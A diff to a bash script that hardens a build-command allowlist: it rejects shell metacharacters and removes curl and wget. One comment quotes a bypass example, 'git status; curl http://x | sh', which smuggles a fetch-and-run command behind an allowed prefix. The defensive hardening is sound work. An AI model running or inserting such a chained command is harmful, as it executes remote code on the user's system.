@@ -115,8 +115,22 @@ mkdir -p "$(dirname "$OUTPUT_JSON")"
 # Check if a command is safe to execute using a whitelist approach.
 # Only commands whose base binary is in the ALLOWED_COMMANDS list are permitted.
 # Returns 0 if safe, 1 if not whitelisted.
+#
+# The command is executed later as a whole string by `bash -c`, so checking the
+# first word alone decides nothing: "git status; curl http://x | sh" passes a
+# base-command check and then runs both halves (#104). Anything carrying shell
+# syntax that could chain, redirect or substitute a second command is therefore
+# rejected outright rather than approved on its prefix.
 is_safe_command() {
     local cmd="$1"
+
+    # Shell metacharacters: command separators (; & |), substitution ($ `),
+    # redirection (< >), grouping ({ } ( )), globs that could expand into
+    # further arguments, and newlines. A documented build command needs none
+    # of them; anything that does is not verifiable by smoke-running it.
+    if [[ "$cmd" == *[\;\&\|\`\$\<\>\{\}\(\)\*\?\!$'\n']* ]]; then
+        return 1
+    fi
 
     # Whitelist of known safe base commands.
     # These are common build/dev tools that are safe to invoke for verification.
@@ -135,7 +149,11 @@ is_safe_command() {
         # Linters and formatters
         eslint prettier phpcs phpcbf phpstan psalm rector black flake8 mypy ruff shellcheck
         # Documentation / misc
-        jq yq curl wget
+        # curl/wget are deliberately absent: fetching a URL is not a way to
+        # verify that a documented build command works, and they are the two
+        # entries that turn an allowlisted base command into an outbound
+        # request (#104). Such commands are reported as not smoke-tested.
+        jq yq
         # Testing
         jest vitest mocha
     )
@@ -177,7 +195,7 @@ smoke_test_command() {
 
     # Safety check - skip dangerous commands
     if ! is_safe_command "$cmd"; then
-        warn "Skipping potentially dangerous command: $cmd"
+        warn "Not smoke-tested (not on the allowlist, or contains shell syntax): $cmd"
         COMMAND_RESULTS["$cmd"]='{"exists": true, "runs": false, "skipped": true, "reason": "safety"}'
         return 1
     fi
